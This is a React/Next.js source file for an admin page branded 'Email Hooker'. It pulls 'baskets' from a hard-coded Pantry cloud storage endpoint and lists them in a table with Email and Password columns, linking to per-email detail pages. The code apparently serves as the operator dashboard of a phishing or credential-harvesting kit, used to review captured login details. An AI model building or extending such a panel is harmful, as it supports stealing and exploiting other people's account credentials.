import React, { useEffect, useState } from 'react'
import Link from 'next/link'

const admin = () => {

    const [Data, setData] = useState([])
    const [Baskets, setBaskets] = useState([])


    useEffect(() => {

        getBaskets()
    }, [])


    const getData = () => {



    }


    const getBaskets = () => {
        let basketList = []
        fetch(`https://getpantry.cloud/apiv1/pantry/0b32f6c1-ae41-4ec1-9faf-71fa0a75a3a6`, {
            method: 'GET',
            headers: {
                'Content-Type': 'application/json',
            },
        })
            .then((response) => response.json())
            .then((data) => {
                setBaskets(data.baskets)
                console.log(Baskets)
            })
            .catch((error) => {
                console.error('Error:', error);
            });


    }


    return (
        <>

            <nav className="bg-white border-gray-200 px-2 sm:px-4 py-2.5 rounded dark:bg-gray-900">
                <div className="container flex flex-wrap items-center justify-between mx-auto">
                    <a href="/admin" className="flex items-center">
                        <span className="self-center text-xl font-semibold whitespace-nowrap dark:text-white">Email Hooker</span>
                    </a>

                    <div className="hidden w-full md:block md:w-auto" id="navbar-default">
                        <ul className="flex flex-col p-4 mt-4 border border-gray-100 rounded-lg bg-gray-50 md:flex-row md:space-x-8 md:mt-0 md:text-sm md:font-medium md:border-0 md:bg-white dark:bg-gray-800 md:dark:bg-gray-900 dark:border-gray-700">
                            <li>
                                <a href="/" className="block text-xl py-2 pl-3 pr-4 text-white bg-blue-700 rounded md:bg-transparent md:p-0 dark:text-white" >Home</a>
                            </li>

                        </ul>
                    </div>
                </div>
            </nav>


            <div className="relative overflow-x-auto md:m-8 my-1">
                <table className="w-full text-sm text-left text-gray-500 dark:text-gray-400">
                    <thead className="text-xs text-gray-700 uppercase bg-gray-50 dark:bg-gray-700 dark:text-gray-400">
                        <tr>
                            <th scope="col" className="px-6 py-3">
                                Basket Name
                            </th>
                            <th scope="col" className="px-6 py-3">
                                Email
                            </th>
                            <th scope="col" className="px-6 py-3">
                                Password
                            </th>
                        </tr>
                    </thead>
                    <tbody>
                        {
                            Baskets.map((e, i) => {
                                return (
                                    <tr className="bg-white border-b dark:bg-gray-800 dark:border-gray-700 cursor-pointer" key={i}>
                                        <th scope="row" className="px-6 py-4 font-medium text-gray-900 whitespace-nowrap dark:text-white">
                                            <Link href={`/Email/${e.name}`}>
                                                <p className='hover:text-red-600'>
                                                    {e.name}
                                                </p>
                                            </Link>
                                        </th>
                                        <td className="px-6 py-4">
                                            ****
                                        </td>
                                        <td className="px-6 py-4">
                                            ****
                                        </td>

                                    </tr>

                                )

                            })
                        }
                    </tbody>

                </table>
            </div>



        </>
    )
}

export default admin